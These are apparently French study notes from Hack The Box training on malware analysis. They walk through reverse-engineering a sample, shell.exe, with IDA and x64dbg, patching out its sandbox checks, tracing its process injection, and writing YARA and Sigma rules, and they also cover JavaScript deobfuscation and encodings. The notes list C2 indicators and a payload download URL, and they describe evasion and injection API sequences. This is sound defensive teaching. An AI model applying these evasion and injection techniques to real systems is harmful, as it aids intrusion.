Observer les entrées : accès registre, fichiers, processus, connexions réseau.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Code Analysis</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8084-b02a-f3c9785989b8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">L'ingénierie inverse permet aux analystes de comprendre la fonctionnalité et le comportement d'un malware en disséquant son code machine compilé. Cela implique généralement de convertir le code machine en langage assembleur et d'interpréter les opérations sans les exécuter.

Lors de l'analyse de code, notre objectif est de :
Dissocier le code pour examiner sa structure et sa logique sans déclencher d'actions.
Identifier les fonctions clés et les éventuels Indicateurs de Compromission (IOCs).
Explorer le flux de contrôle pour repérer des fonctions critiques, telles que la détection de sandbox et les mécanismes de persistance.
Outils pour l'Analyse de Code
Désassembleurs : Utilisés pour l'analyse statique du code machine (par exemple, IDA, Ghidra, Cutter).
Débogueurs : Permettent l'exécution interactive du code et le contrôle de celui-ci (par exemple, x32dbg, x64dbg, OllyDbg).
Exemple d'Analyse de Code : shell.exe

L'échantillon de malware shell.exe illustre diverses techniques, telles que la détection de sandbox et l'injection de processus, qui peuvent être décodées par désassemblage dans IDA.
Importation et Désassemblage de shell.exe dans IDA
Charger shell.exe dans IDA :
Ouvrir IDA en mode administrateur.
Charger l'exécutable et laisser IDA analyser le fichier binaire.
Naviguer dans les vues :
Graph View : Visualise le flux de contrôle des fonctions, facilitant l'identification des chemins d'exécution et de leurs relations.
Text View : Affiche le code assembleur ligne par ligne avec les adresses mémoire, utile pour un examen détaillé des instructions.
Zones Clés d'Analyse
Identifier la fonction principale :
La fonction de démarrage dans IDA montre la configuration initiale. Suivre les appels et les sauts pour localiser la fonction principale. Cela peut inclure des tâches d'initialisation et de configuration des cadres de pile.
Techniques de détection de sandbox :
L'échantillon shell.exe interroge le registre pour détecter la présence de VMware Tools (indicateur d'un environnement virtuel). Les fonctions RegOpenKeyExA et RegQueryValueExA dans le désassemblage révèlent la détection de sandbox basée sur le registre.
IDA montre le chemin de la fonction :

    lea rdx, aSoftwareVmware
    mov rcx, 0FFFFFFFF80000002h
    call cs:RegOpenKeyExA
    IOC possible : Clé de registre SOFTWARE\VMware, Inc.\VMware Tools.
Mécanismes de temporisation :
Les appels à GetSystemTimeAsFileTime, GetCurrentProcessId, et QueryPerformanceCounter peuvent indiquer des mécanismes de temporisation, potentiellement utilisés pour des délais ou des vérifications.
IDA affiche également des instructions de sommeil ou des boucles de retard utilisées par le malware pour éviter la détection.
Connexions réseau :
L'échantillon shell.exe utilise getaddrinfo et WSAStartup pour les opérations réseau. Il peut vérifier la connectivité réseau pour éviter les restrictions de la sandbox.
IOC exemple : Domaine iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea\[.]com.
Mécanismes de persistance :
L'échantillon écrit des entrées dans la clé de registre SOFTWARE\Microsoft\Windows\CurrentVersion\Run pour assurer la persistance.
IOC potentiel : Clé de registre avec l'entrée pour svchost.exe sous WindowsUpdater.
Injection de processus :
shell.exe crée un processus notepad.exe, alloue de la mémoire à l'intérieur de ce dernier via VirtualAllocEx, puis injecte du shellcode en utilisant WriteProcessMemory, suivi de l'appel à CreateRemoteThread.
Fonctions d'injection observées :

    call VirtualAllocEx
    call WriteProcessMemory
    call CreateRemoteThread
    Utilisation des Graphes de Flux de Fonction et des Xref dans IDA
Génération d'un graphe de flux d'appel de fonction :
IDA peut visualiser les relations entre fonctions via View → Graphs → Function calls.
Graphes spécifiques aux fonctions : Faire un clic droit dans la vue de désassemblage, puis sélectionner soit Xrefs graph to... ou Xrefs graph from... pour voir les appels de fonction spécifiques.
Stratégie de Débogage pour shell.exe
Placer des points d'arrêt :
Ajouter des points d'arrêt sur des appels d'API clés (par exemple, RegOpenKeyExA, VirtualAllocEx).
Contrôle du flux d'exécution :
Passer étape par étape dans le code pour observer le comportement en temps réel et valider les vérifications de sandbox ou les mécanismes de persistance suspectés.
Analyse dynamique post-désassemblage :
Le débogage après le désassemblage permet de valider les conclusions initiales et de confirmer les comportements associés aux IOCs.
IOCs Identifiés
Détection de sandbox basée sur le registre :
Clé de registre : SOFTWARE\VMware, Inc.\VMware Tools.
Vérification de la connectivité réseau :
Domaine : iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea\[.]com.
Adresse IP : 45.33.32.156.
Port : 31337.
Technique de persistance :
Clé de registre : SOFTWARE\Microsoft\Windows\CurrentVersion\Run.
Exécutable : svchost.exe dans le répertoire TEMP.
Ressource réseau externe :
URL : http\[:]//ms-windows-update\[.]com/svchost\[.]exe.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Debugging</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8057-ab39-c286bb133d8c"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Débogage dans l'Analyse de Malware

Le débogage est une approche interactive de l'analyse de malware qui permet d'examiner le comportement du code en temps réel. En combinant les informations obtenues via des outils d'analyse statique comme IDA avec des techniques de débogage, les analystes peuvent obtenir une vue d'ensemble du fonctionnement du malware, des mécanismes d'évasion de sandbox et des indicateurs de compromission (IOCs).

Outils de Débogage
x64dbg

x64dbg est un débogueur permettant l'analyse et le contrôle d'exécutables 64 bits. Il offre plusieurs fonctionnalités utiles :
Vue de désassemblage : Affiche le code assembleur du programme.
Vue des registres et de la pile : Montre les valeurs actuelles des registres CPU et la pile d'appel.
Dump mémoire : Visualise la mémoire du programme pour analyser les structures de données et les variables.
INetSim

INetSim permet de simuler des services internet dans un environnement contrôlé, permettant au malware d'interagir avec des services fictifs (DNS, HTTP, etc.) sans risques. Cela permet de reproduire des environnements d'exploitation réseau sans danger.

Configurer le Débogage avec x64dbg
Charger shell.exe dans x64dbg
Lancez x64dbg et sélectionnez Fichier &gt; Ouvrir.
Naviguez jusqu'à shell.exe et ouvrez-le.
Le programme s'arrête à son point d'entrée dans la vue de désassemblage, avec un point d'arrêt par défaut.
Pour commencer l'exécution, appuyez sur F9 ou cliquez sur Run.
Simuler des Services Internet avec INetSim

INetSim permet de configurer des services internet fictifs, capturant et répondant aux requêtes réseau du malware.
Configurer INetSim
Éditer la configuration :

   sudo nano /etc/inetsim/inetsim.conf
   Réglez servicebindaddress et dnsdefaultip sur l'adresse IP de la machine.
Configurez les valeurs DNS par défaut :

     dnsdefaulthostname www
     dnsdefaultdomainname iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
     Lancer INetSim :

   sudo inetsim
   Assurez-vous que le DNS de la cible pointe vers la machine où INetSim est en cours d'exécution.

Contourner les Vérifications de Sandbox

Les malwares vérifient souvent s'ils sont exécutés dans un environnement virtuel ou de sandbox avant de s'exécuter pleinement. Voici comment contourner ces vérifications dans x64dbg.
Étapes pour Contourner les Vérifications de Sandbox
Copier l'adresse depuis IDA :
Dans IDA, identifiez l'adresse de l'instruction cmp pour les vérifications du registre.
Utilisez Go to &gt; Expression dans x64dbg (Ctrl+G) pour localiser cette adresse.
Identifier et patcher l'instruction de comparaison :
Trouvez l'instruction cmp liée à la détection de Sandbox (par exemple, à l'adresse 0x4032C8).
Modifiez cmp [rsp+148h+Type], 1 en cmp [rsp+148h+Type], 0 en utilisant la barre d'espace pour éditer.
Patch des chaînes liées au Sandbox :
Recherchez &gt; Current Module &gt; String references pour trouver Sandbox detected.
Définissez des points d'arrêt sur des chaînes comme 0x4032F13, puis modifiez les sauts conditionnels (par exemple, changez je en jne).
Patch et Sauvegarde de l'Exécutable Modifié

Une fois le patch appliqué :
Sauvegarder l'exécutable modifié :
Appuyez sur Ctrl+P dans x64dbg et sélectionnez Patch File.

L'exécutable modifié contournera désormais les vérifications de sandbox et permettra d'observer tous les comportements du malware.

Analyse du Trafic Réseau
Capturer le Trafic du Malware avec Wireshark
Lancez Wireshark pour capturer tout le trafic réseau généré par le malware.
Analysez :
Requêtes DNS : Observez les connexions vers des domaines comme ms-windows-update\[.]com.
Requêtes HTTP : Le malware peut ajouter le nom d'hôte de l'ordinateur dans l'User-Agent.
Réponses HTTP : Les réponses d'INetSim, comme un fichier binaire par défaut, peuvent déclencher des messages dans le malware.

Analyse de l'Injection de Processus

L'injection de processus est une technique courante où le malware injecte du code dans un autre processus (par exemple, notepad.exe).
Configurer des Points d'Arrêt pour les Fonctions d'Injection
Dans x64dbg :
Recherchez et définissez des points d'arrêt sur VirtualAllocEx, WriteProcessMemory et CreateRemoteThread.
Attacher à notepad.exe :
Ouvrez une autre instance de x64dbg, puis attachez-vous au processus notepad.exe (Alt+A).
Surveillez le code injecté dans la mémoire de notepad.exe en utilisant les dumps mémoire.
Vérifier l'injection de Shellcode :
Examinez le paramètre lpBaseAddress de WriteProcessMemory pour identifier l'adresse de l'injection.
Copiez et collez cette adresse dans la vue du dump mémoire de notepad.exe.
Inspecter le Shellcode Injecté :
Exécutez shell.exe, observez la mémoire peuplée, puis sauvegardez le shellcode pour une analyse plus approfondie.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Creating Detection Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-804a-ae9b-e3bd8c37bbf1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Détection de Malware avec des Règles YARA et Sigma

La détection de malware implique la création de règles permettant d'identifier des comportements malveillants à travers l’analyse de fichiers ou des journaux d’activités. Deux outils puissants pour cela sont YARA (pour la détection basée sur les fichiers) et Sigma (pour la détection basée sur les journaux dans les systèmes SIEM). Voici un guide structuré pour créer des règles de détection pour un échantillon de malware.

Règles YARA

YARA est un outil de correspondance de modèles basé sur des règles, conçu pour identifier des motifs spécifiques dans des fichiers. En créant des règles YARA personnalisées, on peut détecter efficacement certaines caractéristiques dans les fichiers, telles que des chaînes de caractères, des séquences d'octets ou d'autres marqueurs uniques qui sont indicatifs du comportement d'un malware.
Exemple de Règle YARA de Base

Voici un exemple simple de règle YARA pour détecter le message "Sandbox detected" dans un échantillon de malware, comme shell.exe :

rule ShellSandboxDetection {
    strings:
        $sandboxstring = "Sandbox detected"
    condition:
        $sandboxstring
}
Cette règle recherche la chaîne "Sandbox detected" dans un fichier, et si elle est trouvée, une alerte est déclenchée.
Création de Règles YARA Améliorées avec yarGen

Pour des règles plus avancées, nous pouvons utiliser yarGen, un outil qui automatise la création de règles YARA en extrayant des chaînes uniques et des motifs d'un échantillon donné.
Étapes pour Générer des Règles avec yarGen :
Préparer le Répertoire de Test :
   Créez un répertoire et copiez l’échantillon de malware (par exemple, shell.exe) dedans :

   mkdir /home/htb-student/Samples/MalwareAnalysis/Test
   cp /home/htb-student/Samples/MalwareAnalysis/shell.exe /home/htb-student/Samples/MalwareAnalysis/Test/
   Exécuter yarGen :
   Allez dans le répertoire de yarGen et exécutez la commande suivante :

   cd /home/htb-student/yarGen-0.23.4
   sudo python3 yarGen.py -m /home/htb-student/Samples/MalwareAnalysis/Test/
   Cela génère un fichier de règles YARA (yargenrules.yar) contenant les motifs uniques de shell.exe.
Exemple de Règle Générée :

Voici un exemple de règle YARA générée par yarGen :

rule homehtbstudentSamplesMalwareAnalysisTestshell {
   meta:
      description = "Test - fichier shell.exe"
      author = "yarGen Rule Generator"
      date = "2023-08-02"
      hash1 = "bd841e796feed0088ae670284ab991f212cf709f2391310a85443b2ed1312bda"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $s2 = "http://ms-windows-update.com/svchost.exe" fullword ascii
      $s3 = "45.33.32.156" fullword ascii
      $s4 = "[-] Error code is : %lu" fullword ascii
      $s5 = "Connection sent to C2" fullword ascii
      $s6 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 60KB and 3 of ($s)
}
Utilisation de la Règle pour la Détection :

Pour utiliser cette règle pour la détection, exécutez la commande suivante :

yara /home/htb-student/yarGen-0.23.4/yargenrules.yar /home/htb-student/Samples/MalwareAnalysis/
La sortie devrait confirmer la détection si shell.exe est présent dans le répertoire spécifié.

Règles Sigma

Sigma est un format de règle pour la détection des menaces de sécurité dans les systèmes SIEM. Les règles Sigma standardisent la détection à travers différentes plateformes, permettant ainsi de détecter des motifs ou événements malveillants en analysant les journaux.
Exemple de Règle Sigma de Base

Voici un exemple de règle Sigma pour détecter un fichier nommé svchost.exe déposé dans le dossier Temp :

title: Dépôt de fichier suspect dans le dossier Temp de l'utilisateur
status: experimental
description: Détecte l'activité suspecte où un fichier est déposé dans le dossier temp

logsource:
    category: processcreation
detection:
    selection:
        TargetFilename:
'\\AppData\\Local\\Temp\\svchost.exe'
    condition: selection
    level: high

falsepositives:
Dépôts légitimes de fichiers exe dans le dossier temp
Exemple de Règle de Détection avec les Logs Sysmon

Sysmon fournit des journaux détaillés sur les processus, fichiers et connexions réseau, qui peuvent être utilisés pour créer des règles Sigma plus complexes. Exemple de règle pour la création d'un processus en réponse au comportement de shell.exe :

Règle Sysmon - Création de Processus :

title: Création de processus suspecte pour modification de registre
logsource:
   category: processcreation
   product: windows
detection:
   selection:
      Image: 'C:\\Windows\\System32\\cmd.exe'
      CommandLine: 'ping 127.0.0.1 -n 5'
   condition: selection
level: high
description: Détecte la création de processus avec des arguments de ligne de commande liés à des commandes de délai ou de pause
Règle Sysmon - Connexion Réseau :

title: Connexion réseau suspecte à une IP de serveur C2
logsource:
   category: networkconnection
   product: windows
detection:
   selection:
      DestinationIp: '45.33.32.156'
      DestinationPort: 31337
   condition: selection
level: high
description: Détecte les connexions réseau vers une IP de serveur C2 connue
Ressources
YARA :
Documentation : [YARA Documentation](https://virustotal.github.io/yara/)
Règles communautaires : [InQuest’s Awesome YARA](https://github.com/InQuest/awesome-yara)
Sigma :
Documentation : [Sigma Specification](https://github.com/Neo23x0/sigma)
Règles communautaires : [SigmaHQ Rules](https://github.com/SigmaHQ/sigma)
Références et Ressources Complémentaires :
Documentation YARA : [YARA Rules](https://virustotal.github.io/yara/)
Documentation Sigma : [Sigma Rules](https://github.com/Neo23x0/sigma)
DFIR Report : [YARA et Sigma Rules par DFIR](https://www.dfirreport.com/)</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>JavaScript Deobfuscation</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Outils</summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8052-abbd-d1f0211dfb8d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Outils Utilisés

| Outil                                                                                                | Cas d’usage                                                                                                        |
| -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| [https://jsconsole.com](https://jsconsole.com)                                                           | Tester du code JavaScript en ligne, exécuter rapidement des scripts dans un environnement de console.                  |
| [https://javascript-minifier.com/](https://javascript-minifier.com/)                                     | Minification du code : transforme le code JavaScript en une seule ligne compacte pour le rendre plus difficile à lire. |
| [http://beautifytools.com/javascript-obfuscator.php](http://beautifytools.com/javascript-obfuscator.php) | Obfuscation simple ou compression du code pour masquer la logique métier.                                              |
| [https://obfuscator.io/](https://obfuscator.io/)                                                         | Obfuscation avancée avec plusieurs niveaux de protection et options de configuration.                                  |
| [https://beautifier.io/](https://beautifier.io/)                                                         | Réindente et reformate du code JavaScript compacté ou difficile à lire.                                                |
| [https://matthewfl.com/unPacker.html](https://matthewfl.com/unPacker.html)                               | Déobfuscation : permet de retrouver une version lisible du code obfusqué ou packé (par exemple via P.A.C.K.E.R).       |</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Code Analysis</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-807e-ad35-d34ab68bc39a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse de la fonction generateSerial dans secret.js

La fonction generateSerial, présente dans le fichier JavaScript secret.js, effectue une requête POST vers l’URL /serial.php via un objet XMLHttpRequest, sans envoyer de données ni traiter de réponse. Voici une décomposition complète :

Vue d’ensemble du code

'use strict';
function generateSerial() {
  var xhr = new XMLHttpRequest;
  var url = "/serial.php";
  xhr.open("POST", url, true);
  xhr.send(null);
};
Analyse du code étape par étape
Initialisation des variables
xhr : Crée un objet XMLHttpRequest, utilisé pour effectuer des requêtes HTTP en JavaScript.
url : Contient l’URL cible /serial.php, située sur le même domaine (car aucune URL complète n’est précisée).
Logique de la fonction
xhr.open("POST", url, true) : Prépare une requête HTTP de type POST vers /serial.php, en mode asynchrone (paramètre true).
xhr.send(null) : Envoie la requête sans données dans le corps — c’est donc une requête POST vide.
Objectif et usage possible
Cette fonction semble destinée à déclencher un processus côté serveur via /serial.php, probablement pour générer ou vérifier un numéro de série.
L’absence de gestion de réponse (xhr.onreadystatechange, xhr.responseText, etc.) et d’interaction avec des éléments HTML suggère que :
La fonction est incomplète ou en cours de développement.
Ou elle est prévue pour être appelée via un événement, comme un clic sur un bouton « Générer un numéro de série ».
Elle ne semble pas activement utilisée dans l’interface actuelle.

Implications en matière de sécurité

Cette fonction pourrait révéler des comportements ou fonctionnalités cachées sur le serveur :
Le script appelle un endpoint serveur peu visible (/serial.php), ce qui peut indiquer un comportement non documenté ou expérimental.
Il pourrait exister des failles potentielles telles que :
Absence de vérification des autorisations
Manque de validation des requêtes
Réponses contenant des informations sensibles (ex : messages d’erreur, traces de debug)

Étapes suivantes pour l’analyse
Reproduire la requête
   Utiliser curl, Postman ou l’onglet Réseau du navigateur pour envoyer une requête POST vide à /serial.php.

   curl -X POST https://example.com/serial.php
   Analyser la réponse du serveur
Regarder le code HTTP de retour (200, 403, 500, etc.).
Examiner les éventuels contenus retournés : numéro de série, erreurs, indices sur la logique métier.
Évaluer les vulnérabilités potentielles
Vérifier si l’accès à /serial.php est protégé (authentification, droits).
Tester différentes variantes de requêtes (POST avec données, GET).
Identifier si le serveur expose des informations sensibles ou un comportement exploitable.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>HTTP Requests</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8069-a3f5-ed744eb3c4c5"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Bases de cURL
Requête GET simple

Pour récupérer le contenu d'une page web, il suffit de spécifier l’URL avec la commande curl :

curl http://ADRESSEDUSERVEUR:PORT/
Exemple de sortie :

&lt;/html&gt;
&lt;!DOCTYPE html&gt;
&lt;head&gt;
    &lt;title&gt;Secret Serial Generator&lt;/title&gt;
    ...
    &lt;h1&gt;Secret Serial Generator&lt;/h1&gt;
    &lt;p&gt;This page generates secret serials!&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
Ce résultat correspond au code source HTML visible dans l’inspecteur du navigateur.

Requête POST simple

Pour envoyer une requête POST (comme le fait la fonction generateSerial), on utilise l’option -X POST :

curl -s http://ADRESSEDUSERVEUR:PORT/ -X POST
-s active le mode silencieux, qui masque les messages de progression ou d’erreur pour n’afficher que le contenu de la réponse.

Requête POST avec des données

En général, une requête POST inclut des données dans le corps de la requête. Pour cela, on utilise l’option -d :

curl -s http://ADRESSEDUSERVEUR:PORT/ -X POST -d "param1=exemple"
Étapes suivantes

Dans la suite de l’analyse, nous allons simuler exactement la requête POST vers /serial.php comme définie dans la fonction generateSerial.
Même si celle-ci ne transmet pas de données, on peut utiliser curl pour explorer les réponses potentielles du serveur, et ainsi mieux comprendre le fonctionnement de cet endpoint.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Decoding</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80e9-a355-dc53cce88fc2"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Techniques d'encodage courantes

L’encodage est souvent utilisé pour dissimuler ou transformer des données dans un format différent. Voici les méthodes d'encodage les plus fréquemment rencontrées lors d’analyses de sécurité ou de décodage d'informations cachées.

Encodage Base64
But : Convertit des données en un format alphanumérique lisible, avec les caractères + et /, et un ou plusieurs = comme remplissage pour que la longueur soit un multiple de 4.
Comment le repérer : Composé de lettres majuscules/minuscules, de chiffres, souvent avec /, +, et se terminant par =.
Encodage :

echo "https://www.hackthebox.eu/" | base64
Décodage :

echo "aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K" | base64 -d
Exemple :

echo "ZG8gdGhlIGV4ZXJjaXNlLCBkb24ndCBjb3B5IGFuZCBwYXN0ZSA7KQo=" | base64 -d
Ce code se décode en :
"do the exercise, don't copy and paste ;)"

Encodage Hexadécimal (Hex)
But : Représente chaque caractère par sa valeur ASCII en hexadécimal.
Comment le repérer : Ne contient que des caractères de 0-9 et a-f.
Encodage :

echo "https://www.hackthebox.eu/" | xxd -p
Décodage :

echo "68747470733a2f2f7777772e6861636b746865626f782e65752f0a" | xxd -p -r
Chiffrement César / ROT13
But : Décale chaque lettre de l’alphabet d’un nombre fixe (par exemple, ROT13 = décalage de 13 positions).
Comment le repérer : Les caractères restent lisibles, seul leur ordre change. Le texte garde une structure alphabétique reconnaissable.
Encodage / Décodage avec ROT13 (réversible) :

echo "https://www.hackthebox.eu/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Pour décoder (même commande) :

echo "uggcf://jjj.unpxgurobk.rh/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Identifier le type d'encodage

Pour des chaînes ambiguës, des outils en ligne comme Cipher Identifier (par exemple : dcode.fr ou CyberChef) peuvent aider à détecter le type d'encodage automatiquement.

Encodage avancé vs chiffrement
Encodage : Change le format des données pour des raisons techniques (lisibilité, compatibilité) — pas sécurisé.
Chiffrement : Transforme les données de manière incompréhensible sans clé, dans un but de confidentialité.
En analyse de malware, tests de sécurité ou ingénierie inverse, savoir reconnaître et décoder ces formats permet d’identifier des données dissimulées ou des comportements suspects.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>YARA &amp; Sigma for SOC ANalysts</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Y<strong>ARA and YARA Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8095-a0ed-ce8f203e3d1e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">YARA et les Règles YARA

YARA est un outil puissant de correspondance de motifs qui permet d'identifier des fichiers en fonction de motifs et de règles spécifiques. Ces règles permettent aux analystes SOC et aux équipes de criminalistique de détecter, classifier et enquêter sur des fichiers suspects et des échantillons de malwares. Les règles YARA analysent le contenu textuel ou binaire des fichiers et peuvent également être appliquées à la mémoire, contribuant ainsi à la détection de malwares et à la chasse proactive aux menaces.

Utilisations de YARA
Détection de Malware : Permet d'identifier les malwares en se basant sur des motifs ou comportements uniques.
Classification de Fichiers : Aide à classer les fichiers par format, version, métadonnées, etc.
Détection des IOCs : Recherche de l'indicateur de compromission (IOC) dans les fichiers, comme les clés de registre ou les noms de fichiers.
Chasse aux Menaces : Recherche proactive de menaces dans l'environnement.
Réponse aux Incidents : Recherche rapide d'artéfacts en réponse aux incidents de sécurité.
Règles Personnalisées pour Menaces Ciblées : Création de règles sur mesure pour répondre à des besoins organisationnels spécifiques.

Comment YARA Fonctionne
Jeu de Règles : Les règles définissent des motifs ou des comportements à rechercher.
Jeu de Fichiers : Ensemble de fichiers ou de captures mémoire à analyser.
Moteur YARA : Compare le contenu des fichiers octet par octet avec les règles définies.
Sortie de Détection : Si des motifs sont trouvés, YARA marque le fichier comme détecté.

Structure d'une Règle YARA
Structure de Base :

rule NomDeLaRègle {
    meta:
        author = "Nom de l'Auteur"
        description = "Description de la règle"
    strings:
        $string1 = "exempletexte"
        $string2 = { 4A 2D 1C }
    condition:
        all of them
}
Composants d'une Règle YARA :
En-tête de Règle : Commence par le mot-clé rule, suivi du nom de la règle.
Section Meta : Contient des métadonnées telles que l’auteur, la description, la version et les références.
Section Strings : Définit des chaînes de texte, des motifs hexadécimaux ou des expressions régulières à rechercher.
Section Condition : Spécifie les conditions sous lesquelles la règle est déclenchée.
Exemple de Règle – Détection des Chaînes de WannaCry :

rule RansomwareWannaCry {
    meta:
        author = "Nom de l'Analyste"
        description = "Détecte les chaînes spécifiques de WannaCry"
    strings:
        $wannacry1 = "tasksche.exe" fullword ascii
        $wannacry2 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacry3 = "mssecsvc.exe" fullword ascii
    condition:
        all of them
}
Conditions et Opérateurs Logiques :
all of them : Toutes les chaînes spécifiées doivent correspondre.
any of them : N'importe laquelle des chaînes spécifiées peut correspondre.
Condition de Taille de Fichier : Vérifie que la taille du fichier respecte certains critères :

condition:
    filesize &lt; 100KB and uint16(0) == 0x5A4D
uint16(0) == 0x5A4D : Vérifie si les deux premiers octets correspondent à 0x5A4D (indiquant un en-tête MZ pour les exécutables).

Fonctionnalités Avancées des Règles YARA
Opérateurs Logiques : Permet de combiner les conditions avec and, or, not.
Modules Externes : Étend la fonctionnalité des règles pour répondre à des besoins spécifiques.
Personnalisabilité : Permet d'adapter les règles en fonction de menaces ou d'indicateurs spécifiques.</code></pre></div></details><p class="" id="1ea25200-7eb4-8035-8157-e92fe0e084c0">
</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Developing YARA Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-809f-816a-f7c4ddc1c903"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction aux Règles YARA

YARA est un outil puissant permettant de détecter des fichiers malveillants en analysant leur structure et leur contenu. Ce guide présente des exemples concrets de développement de règles YARA pour détecter des exécutables packagés, des malwares spécifiques et d'autres comportements suspects.

Règle YARA de Base pour les Executables Packagés UPX

Analyse de chaînes :

Kailez@htb[/htb]$ strings svchost.exe
Exemple de règle YARA pour détecter des exécutables packagés avec UPX :

rule UPXpackedexecutable {
    meta:
        description = "Détecte les exécutables packagés avec UPX"
    strings:
        $string1 = "UPX0"
        $string2 = "UPX1"
        $string3 = "UPX2"
    condition:
        all of them
}
Explication :
La règle utilise des chaînes typiques d'un fichier packagé avec UPX (comme UPX0, UPX1, et UPX2) pour identifier les exécutables suspectés d'être compressés par UPX.
La condition all of them vérifie que toutes les chaînes sont présentes dans le fichier.

Génération d’une Règle YARA avec yarGen

Commandes :

Kailez@htb[/htb]$ python3 yarGen.py -m /home/htb-student/temp -o htbsample.yar
Exécution :

Kailez@htb[/htb]$ cat htbsample.yar
Cela génère automatiquement une règle YARA en utilisant les caractéristiques des fichiers présents dans le répertoire /home/htb-student/temp.

Exemples de Développement Manuel de Règles YARA
Exemple 1 : Détection du RAT ZoxPNG utilisé par APT17

Analyse de chaînes :

Kailez@htb[/htb]$ strings legit.exe
Calcul du imphash :

Kailez@htb[/htb]$ python3 imphashcalc.py /home/htb-student/Samples/YARASigma/legit.exe
Règle YARA pour APT17 :

import "pe"

rule APT17MalwareOct17Gen {
    meta:
        description = "Détecte le malware APT17"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Florian Roth (Nextron Systems)"
        reference = "https://goo.gl/puVc9q"
        date = "2017-10-03"
        hash1 = "0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2"
    strings:
        $x1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)" fullword ascii
        $x2 = "http://%s/imgres?q=A380&amp;hl=en-US&amp;sa=X&amp;biw=1440&amp;bih=809&amp;tbm=isus&amp;tbnid=aLW4-J8Q1lmYBM" ascii
        $s1 = "hWritePipe2 Error:%d" fullword ascii
        $s2 = "Not Support This Function!" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize &lt; 200KB and (
            pe.imphash() == "414bbd566b700ea021cfae3ad8f4d9b9" or
            1 of ($x*) or
            6 of them
        )
}
Explication :
Utilisation d'un imphash pour identifier les fichiers APT17.
La condition de détection vérifie la signature du fichier, sa taille, et certaines chaînes spécifiques, ainsi que l'empreinte de son fichier PE (pe.imphash()).

Exemple 2 : Détection de Neuron Utilisé par Turla

Reverse Engineering avec monodis :

Kailez@htb[/htb]$ monodis --output=code Microsoft.Exchange.Service.exe
Kailez@htb[/htb]$ cat code
Règle YARA pour Neuron :

rule neuronfunctionsclassesandvars {
    meta:
        description = "Règle de détection pour Neuron basé sur les fonctions .NET et les noms de classes"
        author = "NCSC UK"
        reference = "https://www.ncsc.gov.uk/file/2691/download?token=RzXWTuAB"
        hash = "d1d7a96fcadc137e80ad866c838502713db9cdfe59939342b8e3beacf9c7fe29"
    strings:
        $class1 = "StorageUtils" ascii
        $class2 = "WebServer" ascii
        $func1 = "AddConfigAsString" ascii
        $func2 = "EncryptScript" ascii
        $dotnetMagic = "BSJB" ascii
    condition:
        uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550 and $dotnetMagic and 6 of them
}
Explication :
Cette règle cherche des chaînes spécifiques à des fonctions et classes présentes dans l'exécution de Neuron.
La condition vérifie la signature du fichier et des chaînes associées aux fonctions et classes dans le fichier .NET.

Exemple 3 : Détection de Stonedrill Utilisé dans Shamoon 2.0

Analyse d'entropie :

Kailez@htb[/htb]$ python3 entropypesection.py -f /home/htb-student/Samples/YARASigma/sham2.exe
Règle YARA pour Stonedrill :

import "pe"
import "math"

rule suspfileenumeratorwithencryptedresource101 {
    meta:
        copyright = "Kaspersky Lab"
        description = "Détection générique pour les échantillons énumérant les fichiers avec une ressource cryptée appelée 101"
